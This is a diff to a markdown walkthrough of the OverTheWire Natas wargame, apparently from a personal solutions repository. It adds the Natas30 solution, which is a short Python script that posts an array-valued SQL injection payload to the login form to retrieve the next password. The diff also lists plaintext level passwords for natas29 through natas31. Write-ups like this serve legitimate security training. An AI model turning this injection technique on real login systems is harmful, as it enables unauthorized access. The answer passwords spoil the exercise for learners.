@@ -1579,7 +1579,6 @@ Step 8: After Run the code, we will get the password for Natas29
 + Username : natas29
 +  Password :  31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns
 + Domain : http://natas29.natas.labs.overthewire.org
-
 ## Explanation
 Step 1:  Go to Firefox Browser, Then Connect to natas29.natas.labs.overthewire.org, Then login with username and password
 
@@ -1623,14 +1622,46 @@ Step 10: Again use cat command, along with ? wild charecters, we will get passwo
 + Username : natas30
 +  Password :  WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH
 + Domain : http://natas30.natas.labs.overthewire.org
-
 ## Explanation
+Step 1:  Go to Firefox Browser, Then Connect to natas30.natas.labs.overthewire.org, Then login with username and password
+
+Step 2: You will see the page like this
+
+![image](./images-1/image-30.png)
+
+Step 3: Then click view source code
+
+![image](./images-1/image-30-1.png)
+
+Step 4: we WILL use sql injection 
+
+Step 5: So, we will Write a code like this, In nano editor, Then save the file, Then Run the file by using python filename. Whole process in kali Linux. Because of it has librabraries, we can't Run it online platform.
+
+    import requests
+
+    url = "http://natas30.natas.labs.overthewire.org"
+
+    session = requests.Session()
+    session.auth = ("natas30", "WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH")
+
+    data = {
+        "username": "natas31", 
+        "password": ["' 'or 1", 2]
+    }
+
+    resp = session.post(url, data=data)
+    print(resp.text)
+
+Step 6: After Run the code, we will get the password for Natas31
+
+![image](./images-1/image-30-2.png)
 
 
-
-
-
-
+## Level-31
++ Username : natas31
++  Password :  m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y
++ Domain : http://natas31.natas.labs.overthewire.org
+## Explanation
 
 
 
